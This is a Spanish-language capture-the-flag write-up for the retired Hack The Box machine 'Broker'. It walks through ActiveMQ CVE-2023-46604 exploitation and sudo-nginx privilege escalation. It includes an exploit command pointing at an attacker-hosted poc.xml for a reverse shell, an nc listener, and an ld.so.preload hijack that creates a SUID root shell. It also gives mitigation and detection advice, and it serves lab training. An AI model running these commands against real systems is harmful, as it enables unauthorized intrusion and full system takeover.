---
machine: Broker
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, activemq, deserialization, sudo, nginx]
---

# Broker — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

ActiveMQ 5.15.15 expone OpenWire con CVE-2023-46604. El panel de administración acepta `<DEFAULT_USER>:<DEFAULT_PASSWORD>`, lo que confirma la versión; un XML de Spring malicioso ejecuta comandos como `activemq`. La escalada usa el permiso `sudo nginx` para envenenar `/etc/ld.so.preload` y cargar una biblioteca compartida como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,1883,5672,8161,61613,61614,61616 <IP>
```

- `22/tcp` SSH, `80/tcp` nginx con autenticación básica y `8161/tcp` consola Jetty de ActiveMQ.
- `61616/tcp` habla OpenWire y se identifica como ActiveMQ `5.15.15`.
- `1883/tcp` MQTT, `5672/tcp` AMQP y `61613/tcp` STOMP pertenecen al mismo broker.

## Enumeración

- El panel de `8161` acepta `<DEFAULT_USER>:<DEFAULT_PASSWORD>` y muestra la versión y el estado del broker.
- La versión `5.15.15` está dentro del rango vulnerable de CVE-2023-46604 (anterior a `5.15.16`).
- El exploit público envía un objeto serializado que hace que ActiveMQ cargue un XML de Spring controlado por el atacante.

## Foothold

Se aloja un `poc.xml` con un `ProcessBuilder` que lanza una reverse shell y se apunta el exploit a `61616`.

```bash
python3 exploit.py -i <IP> -u http://<ATTACKER>/poc.xml
nc -lnvp 9001
```

El proceso se ejecuta como `activemq`, el usuario del servicio.

## Movimiento lateral

No hay un segundo host. El movimiento es del broker al sistema operativo mediante la ejecución remota y, después, del usuario `activemq` a root con `sudo`.

## Escalada de privilegios

`sudo -l` permite ejecutar `/usr/sbin/nginx` como root. Se lanza nginx con el log de errores apuntando a `/etc/ld.so.preload`; cada línea del log se interpreta como una biblioteca a precargar. Se copia `/bin/bash`, se compila un `.so` con un constructor que hace `chown root` y `chmod 4755`, y se provoca una ejecución privilegiada.

```bash
sudo -l
sudo /usr/sbin/nginx -c /tmp/nginx.conf
gcc -fPIC -shared -ldl -o /tmp/pwn.so /tmp/pwn.c
sudo -l                 # carga pwn.so y prepara /tmp/rootshell
/tmp/rootshell -p
```

## Evidencia

- Respuesta de `8161` con ActiveMQ `5.15.15`.
- Conexión de la reverse shell como `activemq`.
- `sudo -l` con `NOPASSWD: /usr/sbin/nginx` y `/tmp/rootshell` con SUID.

## Lecciones aprendidas

- Un broker expuesto en `61616` puede ser comprometido sin autenticación si no se parchea.
- Las credenciales por defecto del panel confirman la versión y facilitan el ataque.
- `sudo` sobre un servidor web permite manipular archivos de configuración y rutas de carga.

## Mitigación y detección

- Actualizar ActiveMQ a `5.15.16` o superior y restringir `61616` a la red interna.
- Cambiar las credenciales del panel y deshabilitar cuentas por defecto.
- Auditar `sudo`, ejecuciones de nginx y escrituras en `/etc/ld.so.preload`.

## Referencias

- [0xdf — Broker](https://0xdf.gitlab.io/2023/11/09/htb-broker.html)
- [IppSec — Broker](https://www.youtube.com/watch?v=Ul9WmUY49oM)
- [Hack The Box — Broker](https://app.hackthebox.com/machines/broker)
